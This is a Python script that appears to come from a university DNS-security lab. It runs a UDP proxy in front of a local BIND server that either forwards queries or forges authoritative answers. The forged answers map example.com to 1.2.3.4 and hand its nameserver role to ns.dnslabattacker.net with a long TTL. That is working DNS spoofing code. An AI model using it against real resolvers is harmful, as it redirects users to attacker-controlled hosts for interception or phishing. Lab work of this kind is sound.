#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Configuration from arguments
port = args.port
dns_port = args.dns_port
spoof_response = args.spoof_response

def spoof_dns_response(query_data):
    """
    Generates a spoofed DNS response for a given query, specifically targeting example.com.
    """
    dns_request = DNS(query_data)
    
    # Check if the query is for example.com
    if dns_request.qd.qname == 'example.com.':
        # How to modify packet using Scapy:
        # https://www.usna.edu/Users/cs/choi/it432/lec/l06/lec.html
        # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html
        # Craft a fake response including the spoofed A record and NS record
        dns_response = DNS(id=dns_request.id, qr=1, aa=1, qd=dns_request.qd,
                           an=DNSRR(rrname=dns_request.qd.qname, ttl=99999, rdata='1.2.3.4') / 
                              DNSRR(rrname=dns_request.qd.qname, ttl=99999, type='NS', rdata='ns.dnslabattacker.net.'))
        

    else:
        # How to modify packet using Scapy:
        # https://www.usna.edu/Users/cs/choi/it432/lec/l06/lec.html
        # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html
        # If the query is not for example.com, create a generic response (this could be forwarding instead)
        dns_response = DNS(id=dns_request.id, qr=1, aa=1, qd=dns_request.qd,
                           an=DNSRR(rrname=dns_request.qd.qname, ttl=99999, rdata='1.2.3.4'))
        
    return bytes(dns_response)


def forward_dns_query(data, addr):
    """
    Forwards DNS queries to the specified DNS server and returns the response.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Send data to the BIND DNS server
        sock.sendto(data, ('127.0.0.1', dns_port))
        response, _ = sock.recvfrom(4096)
    finally:
        sock.close()
    return response

def run_proxy(port, dns_port, spoof_response):
    """
    Run the DNS proxy in the loop and handle incoming socket connections.
    """
    # Python Socket Connection:
    # https://realpython.com/python-sockets/
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        proxy_socket.bind(('0.0.0.0', port))
        print("DNS Proxy running on port %d\n" % port)

        while True:
            data, addr = proxy_socket.recvfrom(4096)
            print("Received DNS query from %s" % str(addr))

            if spoof_response:
                print("Spoofing response")
                response = spoof_dns_response(data)
            else:
                print("Forwarding DNS query to BIND server on port %d" % dns_port)
                response = forward_dns_query(data, addr)
            
            proxy_socket.sendto(response, addr)
            print("Response sent back to %s\n" % str(addr))
    
    finally:
        proxy_socket.close()
        print("\n----DNS proxy quit----\n")

if __name__ == "__main__":
    print("----DNS proxy start----\n")
    print("----INFO Section----")
    print("DNS Proxy port number: %d" % port)
    print("DNS Server port number: %d" % dns_port)
    print("Spoof msg: %s" % spoof_response)
    print("--------------------\n")
    run_proxy(port, dns_port, spoof_response)

